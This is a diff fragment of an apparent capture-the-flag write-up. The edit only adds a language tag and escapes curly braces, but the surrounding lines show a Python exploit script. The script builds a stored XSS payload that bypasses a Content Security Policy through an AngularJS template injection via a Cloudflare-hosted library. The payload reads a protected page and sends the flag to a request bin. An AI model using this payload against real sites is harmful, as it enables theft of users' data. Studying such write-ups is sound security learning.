@@ -212,7 +212,7 @@ From the given code of the site, we knew that there was a CSP that is supposed t
 
 ##### Our exploit:
 
-```
+```python
 import requests
 
 # Exploit settings
@@ -231,7 +231,7 @@ flag = 'flag'
 exfil1 = 'fetch(\\"/alien\\")'
 js_payload = 'var xmlHttp = new XMLHttpRequest();xmlHttp.open(\\"GET\\",\\"' + loot_page + '\\",false);xmlHttp.send();document.location=\\"' + request_bin + '\\" + xmlHttp.responseText.substring((xmlHttp.responseText).search(\\"CHTB{\\"),(xmlHttp.responseText).search(\\"}\\")+1)'
 
-csp_bypass = '<script src=\\"' + cloudflare_vulnerable_url + '\\"></script><K Ng-App>{{$new.constructor(\'' + js_payload + '\')()}}'
+csp_bypass = '<script src=\\"' + cloudflare_vulnerable_url + '\\"></script><K Ng-App>\{\{$new.constructor(\'' + js_payload + '\')()\}\}'
 
 post_data = '{\"feedback\":\"' + csp_bypass + '\"}'
 post_headers = {'Content-Type':'application/json'}
